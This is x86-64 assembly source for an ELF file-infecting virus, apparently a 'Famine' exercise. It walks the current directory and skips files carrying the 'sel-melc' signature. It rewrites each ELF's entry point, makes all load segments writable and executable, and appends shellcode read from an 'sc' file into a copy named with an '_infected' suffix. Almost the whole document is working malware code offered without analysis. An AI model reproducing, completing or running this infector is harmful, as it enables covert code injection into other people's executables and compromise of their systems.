;let's do this

global _start

_start:
	push 0x0000002e; our target directory here "."
	lea rdi, [rsp]
	call list_files
	sub rsp, 8

exit_prog:
	mov	rax, 0x3c;
	mov rdi, 1
	syscall

;puts
ft_puts:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	call ft_strlen
	mov rdx, rax
	mov rax, 1
	mov rsi, rdi
	mov rdi, 1
	syscall
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

;this will simply print a newline
debug:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	mov rax, 1
	push 0x0000000a
	lea rsi, [rsp]
	mov rdx, 2
	mov rdi, 1
	syscall
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

debugy:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	mov rax, 1
	push 0x00000a79
	lea rsi, [rsp]
	mov rdx, 2
	mov rdi, 1
	syscall
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn
debugn:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	mov rax, 1
	push 0x00000a6e
	lea rsi, [rsp]
	mov rdx, 2
	mov rdi, 1
	syscall
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn



ft_strlen:
	xor rax, rax
	loop:
		cmp byte[rdi + rax], 0
		je strlen_exit
		inc rax
		jmp loop
	strlen_exit:
retn

%define REGULAR_FILE 8
%define DIRECTORY_FILE 4
;list all files in a folder and calls falmine_file to infect it if it's a regular file
list_files:
	sub rsp, 1024;this is gonna be our buffer
	sub rsp, 4; fd
	mov rsi, 65536; O_RDONLY | O_DIRECTORY
	xor rdx, rdx
	mov rax, 2; sycall open
	syscall
	cmp rax, -1
	je exit_prog ;open error
 	mov [rsp], rax
	dir_read_loop:
		mov rdi, [rsp];fd of dir
		lea rsi, [rsp + 4]; addr of buffer
		mov rdx, 1024;reading max 1024 bytes
		mov rax, 217;getdents64 syscall
		syscall
		cmp rax, -1
		je exit_prog;getdents64 err
		cmp rax, 0
		je dir_read_exit; done reading dir
		mov r10, rax; store number bytes read
		xor rcx, rcx; will serve as index to parse files
		parse_file_loop:
			mov r8, rsi; save rsi
			lea r9, [rsi + rcx] ; current linux_dirent64*
			lea rsi, [r9 + 19];filename
			cmp byte[r9 + 18], 	REGULAR_FILE ; [r9 +18] is file type
			jne skip_file
			;later add here directory handle for recursive infection
			mov rdi, rsi; pass fname as arg
			call famine_file ; void famine_file(char * fname);
			skip_file: 
			mov rsi, r8
			xor rdx, rdx
			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
			add rcx, rdx
			cmp rcx, r10
			jae parse_file_exit
			jmp parse_file_loop
		parse_file_exit: 
		jmp dir_read_loop
	dir_read_exit:
	add rsp, 4
	add rsp,1024
retn

;infect ONE file
;void famine_file(char *fname)
famine_file:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	sub rsp, 8; char *fname
	sub rsp, 8; int filesize
	sub rsp, 8; void *file returned by mmap
	sub rsp, 4 ;fd
	
	call ft_puts ;PRINT FNAME FOR DEBUGGING

	mov [rsp + 20], rdi
	call open_file
	cmp rax, -1
	je leave_famine_file ; could not open file, so skip it
	mov [rsp], rax;stock fd
	call check_already_infected ; int check_already_infected(int fd)
	cmp rax, 0
	jne leave_famine_file; file is already infected 
	mov rdi, [rsp]; fd
	lea rsi, [rsp + 12]; &fsize
	call map_file ; map_file(int fd, int *filesize)
	mov [rsp+4], rax; stock void *file

	; parse MAGIC
	cmp QWORD [rsp + 12], 52; sizeof(Elf32_Ehdr) == 52, check that fsize > sizeof(Elf32_Ehdr) 
	jb leave_famine_file
	xor rax, rax
	mov rax, QWORD[rsp+4]
	cmp byte[rax], 0x7f
	jne leave_famine_file
	cmp byte[rax + 1], 'E'
	jne leave_famine_file
	cmp byte[rax + 2], 'L'
	jne leave_famine_file
	cmp byte[rax + 3], 'F'
	jne leave_famine_file
	cmp byte[rax + 4], 2 ; ELFCLASS64 = 2, when handling 32bit changed the jmp
	jne leave_famine_file
	mov rdi, [rsp + 20] ; fname
	call create_infected_file;will return a fd to it
	cmp rax, -1
	je leave_famine_file; skip if we couldn't create add
	mov rdi, [rsp + 4]; void *file
	mov rsi, rax; wfd
	mov rdx, [rsp + 12]; fsize
	call parse64elf
	; end parse MAGIC
	
	
	leave_famine_file:
	mov rax, 3 ; close syscall n.
	mov rdi, [rsp] ; close(fd)
	syscall

	call debug

	add rsp, 4
	add rsp, 8
	add rsp, 8
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

open_file:
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 2
	syscall
retn

;we're gonna check if file already contains the signature
check_already_infected:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rsi
	push rdx
	push rdi


	call open_file
	mov rdi, rax; store fd in rdi
	sub rsp, 1
	mov rcx, 0x636c656d2d6c6573 ; "sel-melc"
	push rcx
	xor rcx, rcx
	loop_cai:
		lea rsi, [rsp + 8]
		mov rdx, 1; read one byte at the time
		mov rax, 0
		push rcx ; save rcx coz fcking syscall will modify it
		syscall; read(rdi, rsi, rdx);
		pop rcx
		cmp rax, 0
		je end_of_cai
		mov dl, [rsp + rcx]
		cmp byte[rsp + 8], dl
		jne reset_rcx_cai
		inc rcx
		cmp rcx, 8 ;sel-melc 8 bytes long
		je cai_found
		jmp loop_cai
		reset_rcx_cai:
			xor rcx, rcx
			jmp loop_cai
	cai_not_found:
		mov rax, 0
		jmp end_of_cai
	cai_found :
		mov rax, 1
	end_of_cai:
		add rsp, 9
		push rax;save return val
		mov rax, 3
		syscall
		pop rax;restore return val
	
	pop rdi
	pop rdx
	pop rsi
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx

retn
; void *map_file(int fd, int *fsize)
; returns a ptr to fd mapped in memory
map_file:
	sub rsp, 8; start of file saved for lseek
	push rsi; save fsize

	; First we need to get the file size

	mov rax, 8; lseek
	mov rsi, 0
	mov rdx, 1; SEEK_CUR
	syscall; lseek(fd, 0, SEEK_CUR)
	
	mov [rsp + 8], rax; start = lseek(...)
	mov rax, 8
	mov rsi, 0
	mov rdx, 2; SEEK_END
	syscall; lseek(fd, 0, SEEK_END)
	pop rsi
	mov [rsi], rax; *fsize = lseek(...)
	
	push rsi
	mov rsi, [rsp + 8]
	mov rdx, 0; SEEK_SET
	mov rax, 8
	syscall; lseek(fd, start, SEEK_SET) put cursor back at start
	pop rsi; rsi is now fsize again
	
	;Time to map the file into memory
	mov rax, 9; mmap
	mov r8, rdi; fd
	mov rdi, 0; NULL
	mov rdx, 1; PROT_READ
	mov r10, 2; MAP_PRIVATE
	mov r9, 0
	mov rsi, [rsi]; *fsize
	syscall; mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
	cmp rax, -1
	jne mmap_no_err
	mov rax, 0; ret NUlL in case of err
	mmap_no_err:
	add rsp, 8
retn

; int cread_infected_file(char *fname)
; creates a new file called fname + "_infected"
create_infected_file: 
push rcx
push rdx
	
	call ft_strlen
	add rax, 10; so it can contain fname + "_infected" + '\0'
	sub rsp, rax; our string containing fname + "_infected" + '\0' is [rsp + 8]
	push QWORD rax
	lea rsi, [rsp + 8]
	xor rcx, rcx
	cif_loop: ; basically a strcpy of fname
		cmp byte[rdi + rcx], 0
			je cif_loop_exit
		mov dl, byte[rdi + rcx]
		mov byte[rsi + rcx], dl
		inc rcx
		jmp cif_loop
	cif_loop_exit:
	mov byte[rsi + rcx], '_'
	inc rcx
	mov byte[rsi + rcx], 'i'
	inc rcx
	mov byte[rsi + rcx], 'n'
	inc rcx
	mov byte[rsi + rcx], 'f'
	inc rcx
	mov byte[rsi + rcx], 'e'
	inc rcx
	mov byte[rsi + rcx], 'c'
	inc rcx
	mov byte[rsi + rcx], 't'
	inc rcx
	mov byte[rsi + rcx], 'e'
	inc rcx
	mov byte[rsi + rcx], 'd'
	inc rcx
	mov byte[rsi + rcx], 0
	;now rsi contains fname + "_infected"
	mov rax, 2; open
	mov rdi, rsi
	mov rsi, 578 ; O_RDWR | O_CREAT | O_TRUNC
	mov rdx, 511; S_IRWXO | S_IRWXU | S_IRWXG
	syscall; open("fnam_infected", O_RDWR | O_CREAT | O_TRUNC, S_IRWXO | S_IRWXU | S_IRWXG )
	mov rbx, rax; save fd

	pop QWORD rax
	add rsp, rax
	mov rax, rbx
	pop rdx
	pop rcx
retn

; void parse64elf(void *file, int wfd, unsigned long fsize)
parse64elf:
	sub rsp, 8
	;ELF HEADER
	call has_data_seg
	mov QWORD[rsp], rax
	call parse64elfheader
	;PROGRAM HEADERS
	cmp QWORD[rsp], 0
	je text_phdr_parse
	call parse64elfphdr ; will return pad
	jmp phdr_parse_done
	text_phdr_parse:
	call parse64elfphdrtext
	phdr_parse_done:
	;SECTIONS
	mov r10, rax; pass pad as 3rd param
	mov rax, [rsp]; so we know if we have a data_seg or not 
	call parse64elfsec
	
	add rsp, 8
retn

parse64elfheader:
	push rdi
	push rsi
	push rdx

	sub rsp, 8; new entrypoint stocked here
	cmp rax, 0
	je fne_text
	fne_data:
	call find_new_entry; will put it in rax
	jmp fne_done
	fne_text:
	call find_new_entry_text
	fne_done:
	;Copy the begining of Elf header till entry
	mov rbx, rdi
	mov rdi, rsi
	mov rsi, rbx
	mov rdx, 24 ; sizeof(Elf64_Ehdr) till entrypoint
	push rax
	mov rax, 1
	syscall; write(wfd, file, sizeof(Elf64_Ehdr));
	;Time to handle the entrypoint
	pop rax
	mov QWORD[rsp], rax;
	add rsi, 32 ; points right after the entrypoint
	mov rbx, rsi ; store rsi void *file+32
	mov rsi, rsp
	mov rdx, 8
	mov rax, 1
	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
	;Copy the remainder of the elf header
	mov rsi, rbx
	mov rdx, 32
	mov rax, 1
	syscall; write(wfd, file +32, 32); copying everything after entrypoint


	add rsp, 8

	pop rdx
	pop rsi
	pop rdi
retn
%define SHELLCODE_LEN 44
; unsigned long find_new_entry(void *file)
; will return the offset to begining of our shellcode
find_new_entry:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fne: 
		cmp cx, WORD[rsp]
		jge loop_fne_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fne
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_fne
		;we found the data segment ! bss ect... This is where the shellcode will be
		mov rax, QWORD[r9 + 40];store p_memsz
		add rax, QWORD[r9 + 16]; add p_vaddr so this gives us "the end" of the segment
		continue_fne:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_fne
	loop_fne_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn
; unsigned long find_new_entry_text(void *file)
; will return the offset to begining of our shellcode
find_new_entry_text:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fnet: 
		cmp cx, WORD[rsp]
		jge loop_fnet_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fnet
		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		jne continue_fnet
		;we found the text segment !This is where the shellcode will be
		mov rax, QWORD[r9 + 40];store p_memsz
		add rax, QWORD[r9 + 16]; add p_vaddr so this gives us "the end" of the segment
		continue_fnet:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_fnet
	loop_fnet_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn


; unsigned long find_end_data_seg(void *)
; will return the offset at which shellcode starts and where dataseg ends
find_end_data_seg:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_feds: 
		cmp cx, WORD[rsp]
		jge loop_feds_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_feds
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_feds
		;we found the data segment ! bss ect... This is where the shellcode will be
		mov rax, QWORD[r9 + 32];store p_filesz
		add rax, QWORD[r9 + 8]; add p_offset so this gives us "the end" of the segment
		continue_feds:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_feds
	loop_feds_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long find_end_text_seg(void *)
; will return the offset at which shellcode starts and where dataseg ends
find_end_text_seg:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fets: 
		cmp cx, WORD[rsp]
		jge loop_fets_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fets
		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		jne continue_fets
		;we found the data segment ! bss ect... This is where the shellcode will be
		mov rax, QWORD[r9 + 32];store p_filesz
		add rax, QWORD[r9 + 8]; add p_offset so this gives us "the end" of the segment
		continue_fets:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_fets
	loop_fets_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

; int has_data_seg(void *) check if there's a data segment (ret = 1) or only text (ret = 0)
has_data_seg:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_hds: 
		cmp cx, WORD[rsp]
		jge loop_hds_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_hds
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_hds
		mov rax, 1
		;data_seg found !
		continue_hds:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_hds
	loop_hds_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn
; unsigned long parse64elfphdr(void *file, int wfd)
parse64elfphdr:
	push rdi
	push rsi
	push rdx

	sub rsp, 8; p_memsz
	sub rsp, 4;p_flags
	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_p64ephdr: 
		cmp cx, WORD[rsp]
		jge loop_p64ephdr_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne print_p64ephdr
		push rax
		push rcx
		push rsi
		push rdx
		mov rsi, r9
		mov rdx, 4
		mov rax, 1
		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
		mov rdx, 4; sizeof(uint32_t)
		mov rax, 1
		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
		pop rdx
		pop rsi
		pop rcx
		pop rax
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		je p64ephdr_data_seg
		;we just write the rest of the phdr if we get here
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 8]
		mov rdx, 48; 56-8
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
		pop rdx
		pop rsi
		pop rcx
		pop rax
		jmp continue_p64ephdr		
		p64ephdr_data_seg:
		;we found the data segment ! bss ect... Time to infect !
		;write till p_filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 8]
		mov rdx, 24; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
		pop rdx
		pop rsi
		pop rcx
		pop rax
		mov rax, QWORD[r9 + 40]
		mov QWORD[rsp + 6], rax; store p_memsz
		add QWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
		;write custom memsz, filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 38]; 32 from push + 6 rsp
		mov rdx, 8
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write remaining p_align
		push rax
		push rcx
		push rsi
		push rdx
		mov rdx, 8
		lea rsi, [r9 + 48]
		mov rax, 1
		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		sub QWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
		;set pad value
		mov rax, QWORD[rsp + 6]; p_memsz
		sub rax, [r9 + 32]; ret = p_memsz - p_filesz

		jmp continue_p64ephdr
		print_p64ephdr: ; case where we don't modify the phdr at all 
			push rax
			push rcx
			push rsi
			push rdx

			mov rsi, r9
			mov rdx, 56; sizeof(Elf64_Phdr)
			mov rax, 1
			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
			pop rdx
			pop rsi
			pop rcx
			pop rax
		continue_p64ephdr:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_p64ephdr
	loop_p64ephdr_exit: 
	add rsp, 2
	add rsp, 4
	add rsp, 8
	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long parse64elfphdrtext(void *file, int wfd)
parse64elfphdrtext:
	push rdi
	push rsi
	push rdx

	sub rsp, 8; p_memsz
	sub rsp, 4;p_flags
	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_p64ephdrt: 
		cmp cx, WORD[rsp]
		jge loop_p64ephdrt_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne print_p64ephdrt
		push rax
		push rcx
		push rsi
		push rdx
		mov rsi, r9
		mov rdx, 4
		mov rax, 1
		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
		mov rdx, 4; sizeof(uint32_t)
		mov rax, 1
		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
		pop rdx
		pop rsi
		pop rcx
		pop rax
		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		je p64ephdrt_data_seg
		;we just write the rest of the phdr if we get here
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 8]
		mov rdx, 48; 56-8
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
		pop rdx
		pop rsi
		pop rcx
		pop rax
		jmp continue_p64ephdrt		
		p64ephdrt_data_seg:
		;we found the data segment ! bss ect... Time to infect !
		;write till p_filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 8]
		mov rdx, 24; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
		pop rdx
		pop rsi
		pop rcx
		pop rax
		mov rax, QWORD[r9 + 40]
		mov QWORD[rsp + 6], rax; store p_memsz
		add QWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
		;write custom memsz, filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 38]; 32 from push + 6 rsp
		mov rdx, 8
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write remaining p_align
		push rax
		push rcx
		push rsi
		push rdx
		mov rdx, 8
		lea rsi, [r9 + 48]
		mov rax, 1
		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		sub QWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
		;set pad value
		mov rax, QWORD[rsp + 6]; p_memsz
		sub rax, [r9 + 32]; ret = p_memsz - p_filesz

		jmp continue_p64ephdrt
		print_p64ephdrt: ; case where we don't modify the phdr at all 
			push rax
			push rcx
			push rsi
			push rdx

			mov rsi, r9
			mov rdx, 56; sizeof(Elf64_Phdr)
			mov rax, 1
			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
			pop rdx
			pop rsi
			pop rcx
			pop rax
		continue_p64ephdrt:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_p64ephdrt
	loop_p64ephdrt_exit: 
	add rsp, 2
	add rsp, 4
	add rsp, 8
	pop rdx
	pop rsi
	pop rdi
retn


;void parse64elfsec(void *file, int wfd, unsigned long pad)
parse64elfsec:
	sub rsp, 8; file copy 
	sub rsp, 8; offset of "new sect", where we will put pad and shellcode
	sub rsp, 8;start offset 
	mov r9, rdx; we're gonna need rdx for syscalls, store fsize
	mov QWORD[rsp+16], rdi; save void * file
	; find offset where we will put our shellcode
	cmp rax, 0
	je fets_sect
	call find_end_data_seg ; rax now contains the offset to the beg of pad & shellcode
	jmp fes_done
	fets_sect:
	call find_end_text_seg
	fes_done: 
	mov [rsp + 8], rax
	; first we swap file and wfd for syscalls
	mov rbx, rsi
	mov rsi, rdi
	mov rdi, rbx
	;now we need to calculate the offset to EHDR + PHDR*e_phnum
	xor rbx, rbx
	mov bx, WORD[rsi + 56]; bx == e_phnum
	mov rax, 56; sizeof(Elf64_Phdr)
	mul rbx; rbx * rax -> rax
	add rax, QWORD[rsi + 32]; e_phoff
	mov [rsp], rax; [rsp] ==  e_phoff + (sizeof(Elf64_Phdr) * e_phnum)
	lea rsi, [rsi + rax]; file after phdrs
	mov rdx, [rsp + 8]; offset new sect
	sub rdx, [rsp]; rdx == (new_sect - start)
	mov rax, 1
	syscall;write(wfd, file + start, new_sect - start); basically print all from phdrs till end of data seg
	xor rcx, rcx
	loop_print_pad:
	cmp rcx, r10
	jae loop_print_pad_end
	push rsi
	push rcx
	push 0x00000000
	lea rsi, [rsp]
	mov rdx, 1
	mov rax, 1
	syscall; write(wfd, "\0", 1);
	pop rdx; pop the "\0"
	pop rcx
	pop rsi
	inc rcx
	jmp loop_print_pad
	loop_print_pad_end:
	call write_shellcode
	mov rsi, QWORD[rsp + 16]
	add rsi, QWORD[rsp + 8];point to offset end of data seg in file
	mov rdx, r9 ; fsize
	sub rdx, QWORD[rsp + 8]; fsize - new_sect
	mov rax, 1
	syscall;write(wfd, file + new_sect, fsize - new_sect);
	add rsp, 8
	add rsp, 8
	add rsp, 8
retn

;void write_shellcode(int wfd)
write_shellcode:
push rdi
	sub rsp, SHELLCODE_LEN; buffer to read shellcode in
	;OPEN SC FILE
	push rdi
	mov rax, 2
	push 0x00006373 ; "sc"
	mov rdi, rsp
	xor rsi, rsi
	xor rdx,rdx
	syscall; open("sc", O_RDONLY); 
	pop rbx
	;READ SC FILE
	mov rdi, rax
	mov rax, 0
	lea rsi, [rsp+8]
	mov rdx, SHELLCODE_LEN
	syscall; read(sc_fd, buffer, SHELLCODE_LEN);
	mov rax, 3
	syscall; close(sc_fd)
	pop rdi
	mov rax, 1
	mov rsi, rsp
	mov rdx, SHELLCODE_LEN
	syscall;write(wfd, buffer, SHELLCODE_LEN)
	add rsp, SHELLCODE_LEN
pop rdi
retn 	